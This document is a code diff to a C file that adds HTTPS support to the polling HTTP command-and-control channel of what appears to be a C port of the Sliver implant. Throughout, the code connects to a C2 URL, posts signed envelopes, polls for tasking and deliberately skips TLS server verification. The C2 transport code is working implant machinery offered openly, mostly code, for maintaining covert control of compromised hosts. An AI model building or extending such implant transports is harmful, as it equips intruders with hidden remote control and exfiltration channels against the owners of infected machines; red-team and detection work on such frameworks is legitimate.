@@ -1,16 +1,19 @@
-/* src/transport/channel_http.c - POLL channel over HTTP/1.1.
+/* src/transport/channel_http.c - POLL channel over HTTP(S)/1.1.
  *
  * One request carries one signed envelope; the response body carries at most one
- * reply envelope. That is exactly how Sliver's HTTP transport behaves (the Go
- * client posts an envelope and reads the response), so a scheduler keeps calling
- * send()/recv() and never learns the link is request/response instead of duplex.
+ * reply envelope. That is how Sliver's HTTP transport behaves, so a scheduler
+ * keeps calling send()/recv() and never learns the link is request/response
+ * instead of duplex.
  *
- * send(): POST the envelope, queue any reply frame found in the response body.
+ * send(): sign the envelope into a frame, POST it, queue any reply frame found in
+ *         the response body.
  * recv(): pop the queue; when empty, POST an empty body (a poll) once and pop.
- * Returning -1 (not 1) when a poll yields nothing keeps the session loop alive.
+ *         Returning -1 (not 1) when a poll yields nothing keeps the session loop
+ *         alive.
  *
- * https:// is not wired up yet (needs a TLS client that does not require a client
- * certificate); sliver_channel_dial reports that explicitly.
+ * https:// uses TLS without client certificates and without server verification,
+ * matching the Go implant (InsecureSkipVerify for the HTTP layer; envelope
+ * signatures are the real authentication).
  */
 #include "sliver/channel.h"
 
@@ -21,6 +24,7 @@
 #include "sliver/frame.h"
 #include "sliver/log.h"
 #include "sliver/platform.h"
+#include "sliver/transport.h"
 
 #define SLIVER_HTTP_MAX_REPLY 4
 #define SLIVER_HTTP_CONNECT_TIMEOUT_MS 10000
@@ -31,6 +35,7 @@ typedef struct {
   char host[256];
   uint16_t port;
   char path[512];
+  int use_tls;
   const char *server_pubkey;
   sliver_frame_signer_t signer;
   sliver_buf_t queued[SLIVER_HTTP_MAX_REPLY];
@@ -39,7 +44,38 @@ typedef struct {
   int requests;
 } http_channel_t;
 
-/* --- memory reader for frame parsing -------------------------------------- */
+/* One request/response connection: plain TCP or TLS. */
+typedef struct {
+  sliver_socket_t *sock;
+  sliver_tls_t *tls;
+} http_conn_t;
+
+static long conn_write(http_conn_t *c, const void *buf, size_t len) {
+  if (c->tls != NULL) {
+    return sliver_tls_write(c->tls, buf, len);
+  }
+  return sliver_socket_send(c->sock, buf, len);
+}
+
+static long conn_read(http_conn_t *c, void *buf, size_t len) {
+  if (c->tls != NULL) {
+    return sliver_tls_read(c->tls, buf, len);
+  }
+  return sliver_socket_recv(c->sock, buf, len);
+}
+
+static void conn_close(http_conn_t *c) {
+  if (c->tls != NULL) {
+    sliver_tls_close(c->tls);
+    c->tls = NULL;
+  }
+  if (c->sock != NULL) {
+    sliver_socket_close(c->sock);
+    c->sock = NULL;
+  }
+}
+
+/* --- memory reader/writer for frame parsing/building --------------------- */
 typedef struct {
   const unsigned char *data;
   size_t len;
@@ -58,7 +94,6 @@ static long mem_read(void *ctx, void *buf, size_t want) {
   return (long)take;
 }
 
-/* --- memory writer for frame building ------------------------------------ */
 typedef struct {
   unsigned char *data;
   size_t len;
@@ -93,8 +128,9 @@ static long mem_write(void *ctx, const void *buf, size_t len) {
 /* --- request/response ---------------------------------------------------- */
 static int http_roundtrip(http_channel_t *h, const void *body, size_t body_len,
                           unsigned char **out_body, size_t *out_len) {
-  sliver_socket_t *sock;
+  http_conn_t cn;
   char head[768];
+  char errbuf[256];
   int head_len;
   size_t sent = 0;
   size_t total = 0;
@@ -105,14 +141,23 @@ static int http_roundtrip(http_channel_t *h, const void *body, size_t body_len,
 
   *out_body = NULL;
   *out_len = 0;
+  memset(&cn, 0, sizeof(cn));
 
-  sock = sliver_tcp_connect(h->host, h->port);
-  if (sock == NULL) {
-    LOG_WARN("http: cannot connect to %s:%u", h->host, (unsigned)h->port);
-    return -1;
+  if (h->use_tls) {
+    errbuf[0] = '\0';
+    if (sliver_tls_connect_plain(&cn.tls, h->host, h->port, errbuf, sizeof(errbuf)) != 0) {
+      LOG_WARN("https: connect failed: %s", errbuf);
+      return -1;
+    }
+  } else {
+    cn.sock = sliver_tcp_connect(h->host, h->port);
+    if (cn.sock == NULL) {
+      LOG_WARN("http: cannot connect to %s:%u", h->host, (unsigned)h->port);
+      return -1;
+    }
+    sliver_socket_set_recv_timeout(cn.sock, SLIVER_HTTP_RECV_TIMEOUT_MS);
+    sliver_socket_set_send_timeout(cn.sock, SLIVER_HTTP_CONNECT_TIMEOUT_MS);
   }
-  sliver_socket_set_recv_timeout(sock, SLIVER_HTTP_RECV_TIMEOUT_MS);
-  sliver_socket_set_send_timeout(sock, SLIVER_HTTP_CONNECT_TIMEOUT_MS);
 
   head_len = snprintf(head, sizeof(head),
                       "POST %s HTTP/1.1\r\n"
@@ -124,22 +169,22 @@ static int http_roundtrip(http_channel_t *h, const void *body, size_t body_len,
                       h->path[0] != '\0' ? h->path : "/", h->host, (unsigned)h->port,
                       (unsigned)body_len);
   if (head_len <= 0 || (size_t)head_len >= sizeof(head)) {
-    sliver_socket_close(sock);
+    conn_close(&cn);
     return -1;
   }
   while (sent < (size_t)head_len) {
-    long n = sliver_socket_send(sock, head + sent, (size_t)head_len - sent);
+    long n = conn_write(&cn, head + sent, (size_t)head_len - sent);
     if (n <= 0) {
-      sliver_socket_close(sock);
+      conn_close(&cn);
       return -1;
     }
     sent += (size_t)n;
   }
   sent = 0;
   while (body_len != 0 && sent < body_len) {
-    long n = sliver_socket_send(sock, (const unsigned char *)body + sent, body_len - sent);
+    long n = conn_write(&cn, (const unsigned char *)body + sent, body_len - sent);
     if (n <= 0) {
-      sliver_socket_close(sock);
+      conn_close(&cn);
       return -1;
     }
     sent += (size_t)n;
@@ -157,19 +202,19 @@ static int http_roundtrip(http_channel_t *h, const void *body, size_t body_len,
       grown = (unsigned char *)realloc(buf, want);
       if (grown == NULL) {
         free(buf);
-        sliver_socket_close(sock);
+        conn_close(&cn);
         return -1;
       }
       buf = grown;
       cap = want;
     }
-    n = sliver_socket_recv(sock, buf + total, cap - total);
+    n = conn_read(&cn, buf + total, cap - total);
     if (n <= 0) {
       break;
     }
     total += (size_t)n;
   }
-  sliver_socket_close(sock);
+  conn_close(&cn);
 
   if (total == 0 || buf == NULL) {
     free(buf);
@@ -258,8 +303,8 @@ static int http_queue(http_channel_t *h, sliver_buf_t *env) {
 
 /* --- channel vtable ------------------------------------------------------ */
 static const char *http_describe(sliver_channel_t *c) {
-  (void)c;
-  return "http/1.1 (poll)";
+  http_channel_t *h = (http_channel_t *)c->state;
+  return h->use_tls ? "https/1.1 (poll)" : "http/1.1 (poll)";
 }
 
 static int http_send(sliver_channel_t *c, const void *envelope, size_t len) {
@@ -365,14 +410,25 @@ int sliver_channel_http_dial(const char *c2_url, const char *age_private_key,
   const char *slash;
   const char *colon;
   size_t host_len;
+  size_t scheme_len;
 
   if (out == NULL) {
     return -1;
   }
   *out = NULL;
-  if (c2_url == NULL || strncmp(c2_url, "http://", 7) != 0) {
+  if (c2_url == NULL) {
     if (err != NULL && err_len != 0) {
       (void)snprintf(err, err_len, "%s", "http: bad C2 URL");
+    }
+    return -1;
+  }
+  if (strncmp(c2_url, "http://", 7) == 0) {
+    scheme_len = 7;
+  } else if (strncmp(c2_url, "https://", 8) == 0) {
+    scheme_len = 8;
+  } else {
+    if (err != NULL && err_len != 0) {
+      (void)snprintf(err, err_len, "%s", "http: bad C2 URL scheme");
     }
     return -1;
   }
@@ -400,11 +456,12 @@ int sliver_channel_http_dial(const char *c2_url, const char *age_private_key,
     return -1;
   }
 
-  p = c2_url + 7;
+  h->use_tls = (scheme_len == 8);
+  p = c2_url + scheme_len;
   slash = strchr(p, '/');
   colon = strrchr(p, ':');
   if (colon == NULL || (slash != NULL && colon > slash)) {
-    h->port = 80;
+    h->port = h->use_tls ? 443 : 80;
     host_len = slash != NULL ? (size_t)(slash - p) : strlen(p);
   } else {
     h->port = (uint16_t)strtoul(colon + 1, NULL, 10);
